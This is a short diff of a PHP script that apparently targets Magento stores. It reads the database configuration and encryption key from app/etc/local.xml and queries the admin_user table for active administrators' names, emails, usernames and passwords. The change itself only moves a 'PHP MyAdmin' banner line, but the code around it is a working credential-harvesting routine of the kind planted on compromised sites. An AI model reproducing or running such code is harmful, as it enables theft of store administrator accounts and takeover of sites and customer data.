@@ -21,7 +21,6 @@
 
 	if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){
 		$xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');
-		echo'<div align="center">============================[    PHP MyAdmin    ]============================<br><br>';
 		if(isset($xml->global->resources->default_setup->connection)) {
 		   $connection = $xml->global->resources->default_setup->connection;
 		   $prefix = $xml->global->resources->db->table_prefix;
@@ -43,6 +42,7 @@
 		$crypto->init($key);
 
 		//=========================================================================================================
+		echo'<div align="center">============================[    PHP MyAdmin    ]============================<br><br>';
 		$query = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'");
 		if (!$query){
 			  echo "<center><b>Gagal</b></center>";
